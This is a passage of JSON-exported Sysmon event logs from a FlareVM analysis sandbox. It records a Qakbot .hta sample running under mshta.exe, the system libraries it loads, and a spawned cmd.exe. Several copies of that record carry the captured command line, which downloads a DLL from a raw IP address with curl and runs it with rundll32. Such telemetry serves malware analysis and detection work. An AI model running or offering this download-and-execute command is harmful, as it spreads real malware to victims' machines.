Name=\"Hashes\"\u003eSHA1=6D36F794B64D2B8523D6D553C387AA4BDEDA0C11,MD5=69593045E14F379979E0FC24EBE4FCB9,SHA256=3935AB7776A9315D41E64B75E522D7CAA56EDE8E3E89C428505B0D42D8513599,IMPHASH=38D69F1211D9CF420A0045569518C0E0\u003c/Data\u003e\u003cData Name=\"Signed\"\u003etrue\u003c/Data\u003e\u003cData Name=\"Signature\"\u003eMicrosoft Windows\u003c/Data\u003e\u003cData Name=\"SignatureStatus\"\u003eValid\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":7,"RuleName":"-","UtcTime":"2023-03-02 16:38:06.453","ProcessGuid":"159466bb-d0ee-6400-4101-000000000f00","ProcessId":5844,"Image":"C:\\Windows\\SysWOW64\\mshta.exe","ImageLoaded":"C:\\Windows\\SysWOW64\\urlmon.dll","FileVersion":"11.00.19041.2251 (WinBuild.160101.0800)","Description":"OLE32 Extensions for Win32","Product":"Internet Explorer","Company":"Microsoft Corporation","OriginalFileName":"UrlMon.dll","Hashes":"SHA1=6D36F794B64D2B8523D6D553C387AA4BDEDA0C11,MD5=69593045E14F379979E0FC24EBE4FCB9,SHA256=3935AB7776A9315D41E64B75E522D7CAA56EDE8E3E89C428505B0D42D8513599,IMPHASH=38D69F1211D9CF420A0045569518C0E0","Signed":"true","Signature":"Microsoft Windows","SignatureStatus":"Valid","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:06.630Z","TimeGenerated":"2023-03-02T04:38:06.630Z","EventRecordID":"57620","EventID":7,"Message":"Image loaded:\r\nRuleName: -\r\nUtcTime: 2023-03-02 16:38:06.608\r\nProcessGuid: {159466bb-d0ee-6400-4101-000000000f00}\r\nProcessId: 5844\r\nImage: C:\\Windows\\SysWOW64\\mshta.exe\r\nImageLoaded: C:\\Windows\\SysWOW64\\vbscript.dll\r\nFileVersion: 5.812.10240.16384\r\nDescription: Microsoft ® VBScript\r\nProduct: Microsoft ® VBScript\r\nCompany: Microsoft Corporation\r\nOriginalFileName: vbscript.dll\r\nHashes: SHA1=A50A24FEF82802D39F4AD3D7AC3FA3BB752EE0E8,MD5=D726550142BF1D098D0E9F65EE58A05F,SHA256=59A2413759882179E235F1BFF6185148F73305EEF3D2661C8EE318017692A714,IMPHASH=556ED6F66AA25E04D1BF328F88B7E543\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:06.608\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0ee-6400-4101-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e5844\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"ImageLoaded\"\u003eC:\\Windows\\SysWOW64\\vbscript.dll\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e5.812.10240.16384\u003c/Data\u003e\u003cData Name=\"Description\"\u003eMicrosoft ® VBScript\u003c/Data\u003e\u003cData Name=\"Product\"\u003eMicrosoft ® VBScript\u003c/Data\u003e\u003cData Name=\"Company\"\u003eMicrosoft Corporation\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003evbscript.dll\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=A50A24FEF82802D39F4AD3D7AC3FA3BB752EE0E8,MD5=D726550142BF1D098D0E9F65EE58A05F,SHA256=59A2413759882179E235F1BFF6185148F73305EEF3D2661C8EE318017692A714,IMPHASH=556ED6F66AA25E04D1BF328F88B7E543\u003c/Data\u003e\u003cData Name=\"Signed\"\u003etrue\u003c/Data\u003e\u003cData Name=\"Signature\"\u003eMicrosoft Windows\u003c/Data\u003e\u003cData Name=\"SignatureStatus\"\u003eValid\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":7,"RuleName":"-","UtcTime":"2023-03-02 16:38:06.608","ProcessGuid":"159466bb-d0ee-6400-4101-000000000f00","ProcessId":5844,"Image":"C:\\Windows\\SysWOW64\\mshta.exe","ImageLoaded":"C:\\Windows\\SysWOW64\\vbscript.dll","FileVersion":"5.812.10240.16384","Description":"Microsoft ® VBScript","Product":"Microsoft ® VBScript","Company":"Microsoft Corporation","OriginalFileName":"vbscript.dll","Hashes":"SHA1=A50A24FEF82802D39F4AD3D7AC3FA3BB752EE0E8,MD5=D726550142BF1D098D0E9F65EE58A05F,SHA256=59A2413759882179E235F1BFF6185148F73305EEF3D2661C8EE318017692A714,IMPHASH=556ED6F66AA25E04D1BF328F88B7E543","Signed":"true","Signature":"Microsoft Windows","SignatureStatus":"Valid","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:06.634Z","TimeGenerated":"2023-03-02T04:38:06.634Z","EventRecordID":"57621","EventID":7,"Message":"Image loaded:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2023-03-02 16:38:06.623\r\nProcessGuid: {159466bb-d0ee-6400-4101-000000000f00}\r\nProcessId: 5844\r\nImage: C:\\Windows\\SysWOW64\\mshta.exe\r\nImageLoaded: C:\\Windows\\SysWOW64\\amsi.dll\r\nFileVersion: 10.0.19041.2075 (WinBuild.160101.0800)\r\nDescription: Anti-Malware Scan Interface\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: amsi.dll\r\nHashes: SHA1=9A5D9943B76EFB44BA75F1E7BD5F644C46303A3C,MD5=3AAB15DB5E825A804948A45547F3487D,SHA256=9488F75B4FEB3C7CB39B0DA7EB9B306535F41DE7D613D030848FBAADDAB87CA4,IMPHASH=5D28867D6E8659CB14ADCCE290AB3709\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1059.001,technique_name=PowerShell\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:06.623\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0ee-6400-4101-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e5844\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"ImageLoaded\"\u003eC:\\Windows\\SysWOW64\\amsi.dll\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e10.0.19041.2075 (WinBuild.160101.0800)\u003c/Data\u003e\u003cData Name=\"Description\"\u003eAnti-Malware Scan Interface\u003c/Data\u003e\u003cData Name=\"Product\"\u003eMicrosoft® Windows® Operating System\u003c/Data\u003e\u003cData Name=\"Company\"\u003eMicrosoft Corporation\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003eamsi.dll\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=9A5D9943B76EFB44BA75F1E7BD5F644C46303A3C,MD5=3AAB15DB5E825A804948A45547F3487D,SHA256=9488F75B4FEB3C7CB39B0DA7EB9B306535F41DE7D613D030848FBAADDAB87CA4,IMPHASH=5D28867D6E8659CB14ADCCE290AB3709\u003c/Data\u003e\u003cData Name=\"Signed\"\u003etrue\u003c/Data\u003e\u003cData Name=\"Signature\"\u003eMicrosoft Windows\u003c/Data\u003e\u003cData Name=\"SignatureStatus\"\u003eValid\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":7,"RuleName":"technique_id=T1059.001,technique_name=PowerShell","UtcTime":"2023-03-02 16:38:06.623","ProcessGuid":"159466bb-d0ee-6400-4101-000000000f00","ProcessId":5844,"Image":"C:\\Windows\\SysWOW64\\mshta.exe","ImageLoaded":"C:\\Windows\\SysWOW64\\amsi.dll","FileVersion":"10.0.19041.2075 (WinBuild.160101.0800)","Description":"Anti-Malware Scan Interface","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"amsi.dll","Hashes":"SHA1=9A5D9943B76EFB44BA75F1E7BD5F644C46303A3C,MD5=3AAB15DB5E825A804948A45547F3487D,SHA256=9488F75B4FEB3C7CB39B0DA7EB9B306535F41DE7D613D030848FBAADDAB87CA4,IMPHASH=5D28867D6E8659CB14ADCCE290AB3709","Signed":"true","Signature":"Microsoft Windows","SignatureStatus":"Valid","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:06.638Z","TimeGenerated":"2023-03-02T04:38:06.638Z","EventRecordID":"57622","EventID":7,"Message":"Image loaded:\r\nRuleName: technique_id=T1059,technique_name=Command and Scripting Interpreter\r\nUtcTime: 2023-03-02 16:38:06.623\r\nProcessGuid: {159466bb-d0ee-6400-4101-000000000f00}\r\nProcessId: 5844\r\nImage: C:\\Windows\\SysWOW64\\mshta.exe\r\nImageLoaded: C:\\Windows\\SysWOW64\\wshom.ocx\r\nFileVersion: 5.812.10240.16384\r\nDescription: Windows Script Host Runtime Library\r\nProduct: Microsoft ® Windows Script Host Runtime Library\r\nCompany: Microsoft Corporation\r\nOriginalFileName: wshom.ocx\r\nHashes: SHA1=FB707C000DEC1567B0380C94726CC0178F5C8B9A,MD5=F58923FAAFCB20984857287C32D828EC,SHA256=C4F882C3085FB899E7371C29B574A197AEFA523ABC65AB22CE0A6A9F88E9A305,IMPHASH=B3884085B043196DE8AA4306FCCF874E\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1059,technique_name=Command and Scripting Interpreter\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:06.623\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0ee-6400-4101-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e5844\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"ImageLoaded\"\u003eC:\\Windows\\SysWOW64\\wshom.ocx\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e5.812.10240.16384\u003c/Data\u003e\u003cData Name=\"Description\"\u003eWindows Script Host Runtime Library\u003c/Data\u003e\u003cData Name=\"Product\"\u003eMicrosoft ® Windows Script Host Runtime Library\u003c/Data\u003e\u003cData Name=\"Company\"\u003eMicrosoft Corporation\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003ewshom.ocx\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=FB707C000DEC1567B0380C94726CC0178F5C8B9A,MD5=F58923FAAFCB20984857287C32D828EC,SHA256=C4F882C3085FB899E7371C29B574A197AEFA523ABC65AB22CE0A6A9F88E9A305,IMPHASH=B3884085B043196DE8AA4306FCCF874E\u003c/Data\u003e\u003cData Name=\"Signed\"\u003etrue\u003c/Data\u003e\u003cData Name=\"Signature\"\u003eMicrosoft Windows\u003c/Data\u003e\u003cData Name=\"SignatureStatus\"\u003eValid\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":7,"RuleName":"technique_id=T1059,technique_name=Command and Scripting Interpreter","UtcTime":"2023-03-02 16:38:06.623","ProcessGuid":"159466bb-d0ee-6400-4101-000000000f00","ProcessId":5844,"Image":"C:\\Windows\\SysWOW64\\mshta.exe","ImageLoaded":"C:\\Windows\\SysWOW64\\wshom.ocx","FileVersion":"5.812.10240.16384","Description":"Windows Script Host Runtime Library","Product":"Microsoft ® Windows Script Host Runtime Library","Company":"Microsoft Corporation","OriginalFileName":"wshom.ocx","Hashes":"SHA1=FB707C000DEC1567B0380C94726CC0178F5C8B9A,MD5=F58923FAAFCB20984857287C32D828EC,SHA256=C4F882C3085FB899E7371C29B574A197AEFA523ABC65AB22CE0A6A9F88E9A305,IMPHASH=B3884085B043196DE8AA4306FCCF874E","Signed":"true","Signature":"Microsoft Windows","SignatureStatus":"Valid","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:06.649Z","TimeGenerated":"2023-03-02T04:38:06.649Z","EventRecordID":"57623","EventID":7,"Message":"Image loaded:\r\nRuleName: -\r\nUtcTime: 2023-03-02 16:38:06.623\r\nProcessGuid: {159466bb-d0ee-6400-4101-000000000f00}\r\nProcessId: 5844\r\nImage: C:\\Windows\\SysWOW64\\mshta.exe\r\nImageLoaded: C:\\Windows\\SysWOW64\\scrrun.dll\r\nFileVersion: 5.812.10240.16384\r\nDescription: Microsoft ® Script Runtime\r\nProduct: Microsoft ® Script Runtime\r\nCompany: Microsoft Corporation\r\nOriginalFileName: scrrun.dll\r\nHashes: SHA1=FA7435E9E001EE73856EFB6AB8BE154FA630D605,MD5=D2B6E78A63A8D55A892CC4A0676243F4,SHA256=7F4C0929062B2705930DF7863597173D51C6B74E716D13A73DA2008FC0CABF1D,IMPHASH=C5D4473BDA6F2BF7AC3F67F462E5225F\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:06.623\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0ee-6400-4101-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e5844\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"ImageLoaded\"\u003eC:\\Windows\\SysWOW64\\scrrun.dll\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e5.812.10240.16384\u003c/Data\u003e\u003cData Name=\"Description\"\u003eMicrosoft ® Script Runtime\u003c/Data\u003e\u003cData Name=\"Product\"\u003eMicrosoft ® Script Runtime\u003c/Data\u003e\u003cData Name=\"Company\"\u003eMicrosoft Corporation\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003escrrun.dll\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=FA7435E9E001EE73856EFB6AB8BE154FA630D605,MD5=D2B6E78A63A8D55A892CC4A0676243F4,SHA256=7F4C0929062B2705930DF7863597173D51C6B74E716D13A73DA2008FC0CABF1D,IMPHASH=C5D4473BDA6F2BF7AC3F67F462E5225F\u003c/Data\u003e\u003cData Name=\"Signed\"\u003etrue\u003c/Data\u003e\u003cData Name=\"Signature\"\u003eMicrosoft Windows\u003c/Data\u003e\u003cData Name=\"SignatureStatus\"\u003eValid\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":7,"RuleName":"-","UtcTime":"2023-03-02 16:38:06.623","ProcessGuid":"159466bb-d0ee-6400-4101-000000000f00","ProcessId":5844,"Image":"C:\\Windows\\SysWOW64\\mshta.exe","ImageLoaded":"C:\\Windows\\SysWOW64\\scrrun.dll","FileVersion":"5.812.10240.16384","Description":"Microsoft ® Script Runtime","Product":"Microsoft ® Script Runtime","Company":"Microsoft Corporation","OriginalFileName":"scrrun.dll","Hashes":"SHA1=FA7435E9E001EE73856EFB6AB8BE154FA630D605,MD5=D2B6E78A63A8D55A892CC4A0676243F4,SHA256=7F4C0929062B2705930DF7863597173D51C6B74E716D13A73DA2008FC0CABF1D,IMPHASH=C5D4473BDA6F2BF7AC3F67F462E5225F","Signed":"true","Signature":"Microsoft Windows","SignatureStatus":"Valid","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:06.700Z","TimeGenerated":"2023-03-02T04:38:06.700Z","EventRecordID":"57624","EventID":1,"Message":"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2023-03-02 16:38:06.696\r\nProcessGuid: {159466bb-d0ee-6400-4201-000000000f00}\r\nProcessId: 9328\r\nImage: C:\\Windows\\SysWOW64\\cmd.exe\r\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"C:\\Windows\\System32\\cmd.exe\" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 \u0026\u0026 rundll32 fd.dll,N115\r\nCurrentDirectory: C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\\r\nUser: FLAREVM\\malware\r\nLogonGuid: {159466bb-cd20-6400-d5fd-0d0000000000}\r\nLogonId: 0xDFDD5\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=4048488DE6BA4BFEF9EDF103755519F1F762668F,MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A\r\nParentProcessGuid: {159466bb-d0ee-6400-4101-000000000f00}\r\nParentProcessId: 5844\r\nParentImage: C:\\Windows\\SysWOW64\\mshta.exe\r\nParentCommandLine: \"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} \r\nParentUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1059,technique_name=Command-Line Interface\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:06.696\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0ee-6400-4201-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e9328\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\cmd.exe\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e10.0.19041.746 (WinBuild.160101.0800)\u003c/Data\u003e\u003cData Name=\"Description\"\u003eWindows Command Processor\u003c/Data\u003e\u003cData Name=\"Product\"\u003eMicrosoft® Windows® Operating System\u003c/Data\u003e\u003cData Name=\"Company\"\u003eMicrosoft Corporation\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003eCmd.Exe\u003c/Data\u003e\u003cData Name=\"CommandLine\"\u003e\"C:\\Windows\\System32\\cmd.exe\" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 \u0026amp;\u0026amp; rundll32 fd.dll,N115\u003c/Data\u003e\u003cData Name=\"CurrentDirectory\"\u003eC:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003cData Name=\"LogonGuid\"\u003e{159466bb-cd20-6400-d5fd-0d0000000000}\u003c/Data\u003e\u003cData Name=\"LogonId\"\u003e0xdfdd5\u003c/Data\u003e\u003cData Name=\"TerminalSessionId\"\u003e1\u003c/Data\u003e\u003cData Name=\"IntegrityLevel\"\u003eMedium\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=4048488DE6BA4BFEF9EDF103755519F1F762668F,MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A\u003c/Data\u003e\u003cData Name=\"ParentProcessGuid\"\u003e{159466bb-d0ee-6400-4101-000000000f00}\u003c/Data\u003e\u003cData Name=\"ParentProcessId\"\u003e5844\u003c/Data\u003e\u003cData Name=\"ParentImage\"\u003eC:\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"ParentCommandLine\"\u003e\"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} \u003c/Data\u003e\u003cData Name=\"ParentUser\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":1,"RuleName":"technique_id=T1059,technique_name=Command-Line Interface","UtcTime":"2023-03-02 16:38:06.696","ProcessGuid":"159466bb-d0ee-6400-4201-000000000f00","ProcessId":9328,"Image":"C:\\Windows\\SysWOW64\\cmd.exe","FileVersion":"10.0.19041.746 (WinBuild.160101.0800)","Description":"Windows Command Processor","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"Cmd.Exe","CommandLine":"\"C:\\Windows\\System32\\cmd.exe\" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 \u0026\u0026 rundll32 fd.dll,N115","CurrentDirectory":"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\","User":"FLAREVM\\malware","LogonGuid":"159466bb-cd20-6400-d5fd-0d0000000000","LogonId":"0xdfdd5","TerminalSessionId":1,"IntegrityLevel":"Medium","Hashes":"SHA1=4048488DE6BA4BFEF9EDF103755519F1F762668F,MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A","ParentProcessGuid":"159466bb-d0ee-6400-4101-000000000f00","ParentProcessId":5844,"ParentImage":"C:\\Windows\\SysWOW64\\mshta.exe","ParentCommandLine":"\"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} ","ParentUser":"FLAREVM\\malware"},